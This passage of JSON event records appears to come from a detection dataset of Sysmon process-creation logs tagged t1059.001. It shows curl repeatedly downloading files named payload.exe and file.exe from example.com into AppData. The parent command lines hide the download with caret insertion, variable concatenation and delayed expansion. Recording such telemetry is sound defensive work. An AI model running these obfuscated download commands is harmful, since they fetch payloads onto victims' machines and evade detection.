      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_012.evtx",
      "ParentCommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D353-6A2E-F904-000000002C00",
      "ParentProcessId": 3196,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D353-6A2E-FA04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:14:11.670774Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:11.576",
      "Version": 5
    },
    {
      "row_id": 109,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203156,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_013.evtx",
      "ParentCommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D36C-6A2E-1305-000000002C00",
      "ParentProcessId": 1896,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D36C-6A2E-1405-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:14:36.607360Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:36.567",
      "Version": 5
    },
    {
      "row_id": 111,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203218,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_015.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D38C-6A2E-3205-000000002C00",
      "ParentProcessId": 6864,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D38C-6A2E-3305-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:08.151415Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:08.130",
      "Version": 5
    },
    {
      "row_id": 113,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203259,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_016.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3A2-6A2E-4605-000000002C00",
      "ParentProcessId": 4400,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3A2-6A2E-4705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:30.767255Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:30.751",
      "Version": 5
    },
    {
      "row_id": 115,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203307,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_017.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3BC-6A2E-5D05-000000002C00",
      "ParentProcessId": 8052,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3BC-6A2E-5E05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:56.184344Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:56.150",
      "Version": 5
    },
    {
      "row_id": 117,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203357,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_018.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3D4-6A2E-7705-000000002C00",
      "ParentProcessId": 2724,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3D5-6A2E-7805-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:16:21.096230Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:21.065",
      "Version": 5
    },
    {
      "row_id": 119,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203403,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_019.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3E9-6A2E-8D05-000000002C00",
      "ParentProcessId": 9720,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3E9-6A2E-8E05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:16:41.465312Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:41.428",
      "Version": 5
    },
    {
      "row_id": 121,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203453,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_020.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D40B-6A2E-A605-000000002C00",
      "ParentProcessId": 7864,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D40B-6A2E-A705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:17:15.931898Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:15.908",
      "Version": 5
    },
    {
      "row_id": 124,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\thaim\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203492,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_021.evtx",
      "ParentCommandLine": "cmd  /c curl http://example.local/test.txt -o C:\\Users\\thaim\\%A%%D%\\Roaming\\test.txt",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D427-6A2E-BA05-000000002C00",
      "ParentProcessId": 10244,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D427-6A2E-BB05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:17:43.347421Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:43.317",
      "Version": 5
    },
    {
      "row_id": 126,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203537,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_022.evtx",
      "ParentCommandLine": "cmd.exe /V:ON /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D442-6A2E-D005-000000002C00",
      "ParentProcessId": 7944,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D442-6A2E-D105-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:10.263557Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:10.236",
      "Version": 5
    },
    {
      "row_id": 128,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203580,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_023.evtx",
      "ParentCommandLine": "cmd.exe /V:oN /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D454-6A2E-E605-000000002C00",
      "ParentProcessId": 9392,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D454-6A2E-E705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:28.857880Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:28.799",
      "Version": 5
    },
    {
      "row_id": 130,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203634,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_024.evtx",
      "ParentCommandLine": "cmd.exe /v:on /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D46B-6A2E-0106-000000002C00",
      "ParentProcessId": 3004,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D46B-6A2E-0206-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:51.768303Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:51.742",
      "Version": 5
    },
